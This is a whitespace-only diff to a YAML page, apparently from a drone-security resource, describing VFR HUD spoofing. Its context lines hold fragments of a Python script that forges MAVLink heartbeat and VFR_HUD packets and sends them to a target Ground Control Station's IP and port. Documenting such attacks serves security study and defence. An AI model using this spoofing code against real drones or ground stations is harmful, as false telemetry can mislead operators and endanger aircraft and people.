@@ -10,9 +10,9 @@ breadcrumb:
 sections:
   - title: Description
     content: |
-      VFR HUD spoofing involves sending false VFR HUD data (airspeed, ground speed, altitude, 
-      climb rate, heading, and throttle) to the Ground Control Station (GCS) to mislead it about 
-      the drone's actual flight status. This can cause the operator to make incorrect decisions 
+      VFR HUD spoofing involves sending false VFR HUD data (airspeed, ground speed, altitude,
+      climb rate, heading, and throttle) to the Ground Control Station (GCS) to mislead it about
+      the drone's actual flight status. This can cause the operator to make incorrect decisions
       based on the spoofed data.
 
   - title: Resources
@@ -57,7 +57,7 @@ sections:
                   custom_mode=3,  # Custom mode to indicate flying (ArduCopter: GUIDED mode)
                   system_status=mavutil.mavlink.MAV_STATE_ACTIVE
               )
-              
+
               return heartbeat.pack(mav)
 
           def create_vfr_hud():
@@ -106,7 +106,7 @@ sections:
 
                   send_mavlink_packet(heartbeat_packet, target_ip, target_port)
                   send_mavlink_packet(vfr_hud_packet, target_ip, target_port)
-                  
+
                   print(f"Sent heartbeat and VFR_HUD packets to {target_ip}:{target_port}")
 
           ```
